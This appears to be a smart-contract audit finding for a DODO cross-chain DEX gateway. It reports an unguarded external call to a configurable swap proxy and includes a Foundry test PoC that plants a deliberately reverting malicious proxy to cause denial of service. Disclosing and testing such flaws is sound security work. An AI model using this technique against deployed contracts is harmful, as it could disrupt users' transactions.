# Unsafe External Call to DODORouteProxy Enables Denial of Service or Fund Misuse

### Summary

A missing `try/catch` and trust check on the external `DODORouteProxy` swap router will cause a transaction revert for users as a misconfigured or malicious proxy reverts during execution of `mixSwap`.

### Root Cause

In [GatewaySend.sol:_doMixSwap](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewaySend.sol#L202), the call to
```solidity
 IDODORouteProxy(DODORouteProxy).mixSwap{value: msg.value}(...params) 
```
is made without a try/catch, return validation, or router trust enforcement.

### Internal Pre-conditions

1. Admin sets `DODORouteProxy` to a contract that reverts or behaves unexpectedly (due to misconfiguration or malicious deployment)

2. User calls `depositAndCall()` to trigger a swap through `_doMixSwap`

### External Pre-conditions

1. The contract at the configured `DODORouteProxy` address reverts in `mixSwap`.

2. The revert is not caught or handled by `GatewaySend`.

### Attack Path

- Attacker deploys a contract that implements `mixSwap()` but always reverts
 
- Admin mistakenly sets `DODORouteProxy` to this contract
 
- User calls `depositAndCall()` expecting a valid swap
 
- `_doMixSwap()` calls `mixSwap` on the untrusted proxy
 
- The proxy reverts
 
- The revert bubbles up, reverting the user’s entire transaction

### Impact

The **user’s swap transaction reverts**, causing **denial of service**.
If a malicious proxy instead succeeds and returns manipulated values, the protocol could also experience fund misdirection or incorrect accounting.

### PoC

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/GatewaySend.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// @dev A minimal ERC20 for testing
contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1_000 ether);
    }
}

/// @dev Malicious DODO proxy that always reverts
contract RevertingDODO {
    fallback() external payable {
        revert("DODO_REVERT");
    }
    function mixSwap(
        address, address, uint256,
        uint256, uint256,
        address[] calldata, address[] calldata,
        address, uint8[] calldata,
        bytes calldata, bytes calldata,
        uint256
    ) external payable returns (uint256) {
        revert("DODO_REVERT");
    }
}

contract UnsafeExternalCallTest is Test {
    GatewaySend public gateway;
    MockERC20      public token;
    RevertingDODO  public evilProxy;
    address        public user = address(0xBEEF);

    function setUp() public {
        // 1) Deploy GatewaySend and the malicious proxy
        gateway   = new GatewaySend();
        evilProxy = new RevertingDODO();

        // 2) Manually set DODORouteProxy (slot 2) to our evil proxy
        vm.store(
            address(gateway),
            bytes32(uint256(2)),
            bytes32(uint256(uint160(address(evilProxy))))
        );

        // 3) Deploy and fund a test token
        token = new MockERC20();
        token.transfer(user, 100 ether);
    }

    function testMixSwapRevertBubblesUp() public {
        // Prepare empty swapData so _doMixSwap calls mixSwap
        bytes memory emptySwapData = "";

        // User approves gateway to pull tokens
        vm.prank(user);
        token.approve(address(gateway), 100 ether);

        // Expect revert from evilProxy to bubble up
        vm.prank(user);
        vm.expectRevert(); // accept any revert

        gateway.depositAndCall(
            address(token),   // fromToken
            100 ether,        // amount
            emptySwapData,    // swapData
            address(0),       // targetContract
            address(token),   // asset
            1,                // dstChainId
            ""               // payload
        );
    }
}
```
